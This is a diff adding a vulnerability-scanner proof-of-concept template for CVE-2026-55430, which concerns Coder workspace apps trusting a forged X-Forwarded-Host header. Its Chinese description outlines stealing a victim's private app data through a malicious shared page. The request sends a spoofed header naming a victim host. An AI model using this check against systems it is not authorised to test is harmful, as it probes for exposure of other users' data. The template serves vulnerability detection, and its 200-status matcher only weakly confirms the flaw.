@@ -1,0 +1,27 @@
+[info]
+author = "ave"
+description = "验证 Coder 工作区应用子域名路由是否信任未认证的 X-Forwarded-Host 头。需启用子域名应用路由（通配符主机名），构造恶意共享应用页面，通过 JavaScript fetch() 发送携带伪造 X-Forwarded-Host 头的同站请求，检测服务器是否按伪造头路由并返回受害者私有应用数据。"
+id = "POC-AVE-2026-0604"
+name = "CVE-2026-55430 PoC"
+severity = "medium"
+tags = ["ave-2026-0604"]
+vuln_id = [
+    "CVE-2026-55430",
+    "AVE-2026-0604",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/.well-known/health"
+protocol = "http"
+
+[poc.requests.headers]
+X-Forwarded-Host = "victim-app.coder.example.com"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
